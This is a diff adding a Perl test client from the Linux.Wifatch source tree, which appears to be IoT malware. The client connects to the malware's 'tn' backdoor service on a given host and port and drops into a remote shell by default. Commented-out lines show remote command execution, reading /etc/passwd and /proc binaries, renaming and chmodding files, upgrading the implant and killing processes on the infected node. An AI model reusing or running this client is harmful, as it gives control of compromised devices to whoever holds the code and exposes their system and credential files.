@@ -1,0 +1,57 @@
+#!/usr/bin/env perl
+#
+# This file is part of Linux.Wifatch
+#
+# Copyright (c) 2013,2014,2015 The White Team <rav7teif@ya.ru>
+#
+# Linux.Wifatch is free software: you can redistribute it and/or modify
+# it under the terms of the GNU General Public License as published by
+# the Free Software Foundation, either version 3 of the License, or
+# (at your option) any later version.
+#
+# Linux.Wifatch is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License
+# along with Linux.Wifatch. If not, see <http://www.gnu.org/licenses/>.
+#
+
+# test code for tn, by default, give shell. usage: tnclient host:port
+
+use strict;
+
+use bm::tn;
+use bm::file;
+
+my $tn = new bm::tn split /:/, shift;
+
+#use Data::Dump; ddx $tn->rsh ("ls");
+
+#$tn->open ("/etc/passwd");
+#while (length (my $buf = $tn->readall (1))) {
+#	syswrite STDOUT, "$buf\n";
+#}
+#use Data::Dump; ddx $tn->readdir ("/etc");
+#exit;
+#warn unpack "H*", $tn->keccak ("sha");
+
+#my $file = bm::file::load "arch/x86/tn";
+
+#print $tn->read_file ("/proc/1240/exe");exit;
+#$tn->rename ("/tmp/x", "/tmp/y");
+#$tn->chmod (0751, "/tmp/x");
+#$tn->upgrade;
+
+#warn $tn->kill (0, 1);
+
+#warn $tn->rsh ("date;sleep 5");
+
+#$tn->wpkt (chr 21); $tn->{rq}->put (sub { warn unpack "H*", $tn->rpkt });
+#$tn->rsh ("sleep 5");
+#$tn->wpkt (chr 21); $tn->{rq}->put (sub { warn unpack "H*", $tn->rpkt });
+#Coro::AnyEvent::sleep 99;
+
+$tn->telnet;
+
